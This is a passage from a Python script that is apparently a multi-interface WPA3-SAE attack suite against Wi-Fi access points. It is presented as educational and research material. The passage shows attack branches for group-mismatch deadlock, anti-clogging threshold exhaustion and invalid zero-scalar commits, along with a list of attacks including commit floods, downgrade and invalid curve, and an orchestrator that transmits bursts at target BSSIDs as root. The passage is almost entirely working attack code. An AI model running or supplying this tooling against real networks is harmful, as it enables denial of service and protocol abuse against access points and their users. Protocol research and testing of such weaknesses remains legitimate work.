            elif attack_type == "group_mismatch_tiebreaker_deadlock":
                attacker_mac = get_greater_mac(bssid)
                mismatch_group = 20 if active_group == 19 else 19
                s_len, e_len = SAE_GROUP_LENGTHS[mismatch_group]
                inv_s, inv_f = b'\x00' * s_len, b'\x00' * e_len
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(attacker_mac, gid=mismatch_group, s_bytes=inv_s, f_bytes=inv_f))

            elif attack_type == "threshold_boundary":
                macs = [get_unicast_rand_mac() for _ in range(ANTI_CLOGGING_THRESHOLD)]
                for m in macs:
                    packets.append(make_commit(m, gid=active_group))

            elif attack_type == "silent_discard":
                res = {'accepted': 0, 'rejected': 0, 'other': 0}
                lock_obj = Lock()
                sniff_thread = Thread(target=sniff, kwargs={
                    'iface': interface,
                    'prn': _silent_discard_callback(bssid, res, lock_obj),
                    'timeout': 3,
                    'store': False,
                    'lfilter': lambda p: p.haslayer(Dot11Auth) and p.addr2 and p.addr2.lower() == bssid_lower
                })
                sniff_thread.start()
                time.sleep(0.05)

                s_len = SAE_GROUP_LENGTHS[active_group][0]
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(get_unicast_rand_mac(), gid=active_group, s_bytes=b'\x00' * s_len))

                sock = send_burst_scientific(packets, sock, interface, counter, dry_run)
                packets = []
                sniff_thread.join()

                logger.info(
                    f"[SILENT_DISCARD] AP Response Summary: "
                    f"Accepted={res['accepted']} | Rejected={res['rejected']} | Other={res['other']}"
                )
                if res['accepted'] > 0:
                    logger.warning("[SILENT_DISCARD] CRITICAL: AP accepted invalid scalar=0!")

            else:
                logger.warning(f"[ATTACK] Unknown type: {attack_type}. Fallback to commit_flood.")
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(get_unicast_rand_mac(), gid=active_group))

            if packets:
                sock = send_burst_scientific(packets, sock, interface, counter, dry_run)
                burst_count += 1
                dt = time.time() - t0

                LOG_EVERY_N_BURSTS = 5
                if burst_count % LOG_EVERY_N_BURSTS == 0:
                    logger.info(
                        f"[BURST] Interface: {interface} | Band: {band} | Channel: {current_channel} | "
                        f"Attack: {attack_type.upper()} | Active Group: {active_group} | "
                        f"Pairs: {valid_pairs_count} | Burst: #{burst_count} | Duration: {dt:.3f}s"
                    )

                rate_delay = 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)
                time.sleep(max(LOG_DELAY_BETWEEN_BURSTS, rate_delay))

    except KeyboardInterrupt:
        logger.info(f"[STOP] Interface: {interface} interrupted")
    except Exception as e:
        logger.error(f"[CRASH] Interface: {interface} | Error: {e}")
    finally:
        close_l2_socket(sock)
        logger.info(f"[STOP] {interface} worker exited cleanly")


# ==============================================================================
# ERRATA COVERAGE & LOGGING
# ==============================================================================
ERRATA_MAP = {
    "reflection_attack": ["#23 Replay/Reflection guard (cL!=cR)"],
    "deadlock": ["#16 Del-event after UNKNOWN_PASSWORD_IDENTIFIER", "#17 Silent discard + Del on validation fail"],
    "unknown_pw_id": ["#1 Mesh PW-ID restriction", "#16 Del-event after UNKNOWN_PASSWORD_IDENTIFIER"],
    "downgrade": ["#19 Group negotiation Fail-event & MAC logic"],
    "memory_exhaustion": ["#5 Anti-clogging >= threshold"],
    "simultaneous_pw_id_conflict": ["#A Password Identifier Handling restrictions"],
    "group_mismatch_tiebreaker_deadlock": ["#M Group Mismatch Error Handling"],
    "threshold_boundary": ["#C Anti-Clogging Threshold operators"],
    "silent_discard": ["#K Silent Discard on Commit Validation Failure"]
}


def log_attack_meta(attack: str, band: str, ch: str, iface: str, dry: bool):
    """Writes attack metadata to a JSON-lines log file for research documentation."""
    meta = {
        "timestamp": datetime.now().isoformat(),
        "attack": attack,
        "band": band,
        "channel": ch,
        "interface": iface,
        "dry_run": dry,
        "errata_mitigations": ERRATA_MAP.get(attack, ["N/A"])
    }
    try:
        with open("/tmp/sae_attack_log.jsonl", "a", encoding="utf-8") as f:
            f.write(json.dumps(meta) + "\n")
    except Exception as e:
        logger.warning(f"[LOG] Could not write metadata log: {e}")


# ==============================================================================
# GRACEFUL SHUTDOWN HANDLER
# ==============================================================================
def graceful_shutdown(sig, frame):
    if not SHUTDOWN_FLAG.value:
        logger.info("[SIGNAL] Shutdown requested. Stopping all processes...")
        SHUTDOWN_FLAG.value = True


def cleanup(procs, scanner):
    SHUTDOWN_FLAG.value = True
    for iface, p in procs.items():
        try:
            if p is not None and hasattr(p, 'is_alive') and p.is_alive():
                p.terminate()
                p.join(timeout=2)
                if p.is_alive():
                    p.kill()
        except (AttributeError, ValueError, OSError) as e:
            logger.warning(f"[CLEANUP] Error stopping {iface}: {e}")
    if scanner is not None:
        try:
            if hasattr(scanner, 'is_alive') and scanner.is_alive():
                scanner.terminate()
                scanner.join(timeout=2)
                if scanner.is_alive():
                    scanner.kill()
        except (AttributeError, ValueError, OSError) as e:
            logger.warning(f"[CLEANUP] Error stopping scanner: {e}")


def main():
    valid_attacks = [
        "commit_flood", "reflection_attack", "memory_exhaustion", "deadlock",
        "zero_scalar", "invalid_curve", "downgrade", "open_auth", "unknown_pw_id",
        "simultaneous_pw_id_conflict", "group_mismatch_tiebreaker_deadlock",
        "threshold_boundary", "silent_discard"
    ]

    parser = argparse.ArgumentParser(
        description="WPA3-SAE Formal Attack Suite (Educational/Research Edition)",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=ENCYCLOPEDIA_TEXT
    )
    parser.add_argument("--dry-run", action="store_true", help="Construct packets but DO NOT send")
    parser.add_argument("--attack", type=str, choices=valid_attacks, help="Override attack type for all given interfaces")
    parser.add_argument("--interfaces", type=str, help="Comma-separated list of interfaces (e.g. wlan10mon,wlan1mon)")
    parser.add_argument("--band", type=str, help="Comma-separated list of bands mapping to interfaces (e.g. 5GHz,2.4GHz,6GHz)")
    parser.add_argument("--sae-file", type=str, help="Optional path to JSON file containing extracted SAE scalars/finites")
    args = parser.parse_args()
    dry_run = args.dry_run

    if os.geteuid() != 0 and not dry_run:
        sys.exit("Root required (sudo). Use --dry-run for unprivileged testing.")

    signal.signal(signal.SIGINT, graceful_shutdown)
    signal.signal(signal.SIGTERM, graceful_shutdown)

    if args.sae_file:
        load_sae_file(args.sae_file)

    logger.info(
        "[MODE] DRY-RUN: Packets constructed but NOT transmitted."
        if dry_run else "[MODE] EXECUTE: Packets WILL be transmitted!"
    )

    global ADAPTER_CONFIGURATION
    if args.interfaces or args.band:
        if not (args.interfaces and args.band):
            sys.exit("Error: To override adapters, BOTH --interfaces and --band must be provided.")
        ifaces = [i.strip() for i in args.interfaces.split(',')]
        bands = [b.strip() for b in args.band.split(',')]
        if len(ifaces) != len(bands):
            sys.exit("Error: The number of --interfaces must exactly match the number of --band arguments.")
        if not args.attack:
            sys.exit("Error: Please specify an --attack when overriding interfaces.")

        ADAPTER_CONFIGURATION = {}
        for i in range(len(ifaces)):
            ADAPTER_CONFIGURATION[ifaces[i]] = {"band": bands[i], "attack": args.attack}
    elif args.attack:
        for iface in ADAPTER_CONFIGURATION:
            ADAPTER_CONFIGURATION[iface]['attack'] = args.attack

    shared = Manager().dict({
        '2.4GHz': MANUAL_CHANNEL_2_4GHZ,
        '5GHz': MANUAL_CHANNEL_5GHZ,
        '6GHz': MANUAL_CHANNEL_6GHZ
    })
    lock = Lock()
    scanner_proc = None
    if SCANNER_INTERFACE:
        scanner_proc = Process(
            target=scanner_process,
            args=(
                SCANNER_INTERFACE, SCANNER_INTERVAL, SCANNER_DURATION,
                shared, lock, TARGET_BSSID_5GHZ, TARGET_BSSID_2_4GHZ, TARGET_BSSID_6GHZ
            ),
            daemon=True
        )
        scanner_proc.start()
        time.sleep(2)

    procs = {}
    counters = {i: Value('L', 0) for i in ADAPTER_CONFIGURATION}

    try:
        while not SHUTDOWN_FLAG.value:
            for iface, cfg in ADAPTER_CONFIGURATION.items():
                if SHUTDOWN_FLAG.value:
                    break
                band, attack = cfg['band'], cfg['attack']

                with lock:
                    ch = shared.get(band)
                    if not ch:
                        if band == '6GHz':
                            ch = MANUAL_CHANNEL_6GHZ
                        elif band == '5GHz':
                            ch = MANUAL_CHANNEL_5GHZ
                        else:
                            ch = MANUAL_CHANNEL_2_4GHZ

                if not ch:
                    logger.info(f"[WAIT] {iface}: Waiting for scanner to find {band} AP channel...")
                    time.sleep(3)
                    continue

                try:
                    proc_alive = procs.get(iface) is not None and procs[iface].is_alive()
                except (AttributeError, ValueError):
                    proc_alive = False

                if not proc_alive:
                    validate_sae_data(band)
                    log_attack_meta(attack, band, ch, iface, dry_run)
                    _, _, _, target_b = get_band_dicts(band)
                    p = Process(
                        target=run_attacker_process,
                        args=(iface, target_b, ch, band, attack, counters[iface], shared),
                        kwargs={'dry_run': dry_run},
                        daemon=True
                    )
                    procs[iface] = p
                    p.start()
                    logger.info(f"[ORCHESTRATOR] Interface: {iface} | Band: {band} | Channel: {ch} | Attack: {attack.upper()}")
                    time.sleep(LOG_DELAY_BETWEEN_ATTACKS)
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("[INFO] Ctrl+C detected. Shutting down gracefully...")
    finally:
        cleanup(procs, scanner_proc)
        total_sent = sum(c.value for c in counters.values())
        logger.info(f"[DONE] Shutdown complete. Total packets transmitted: {total_sent}")


if __name__ == "__main__":
    main()
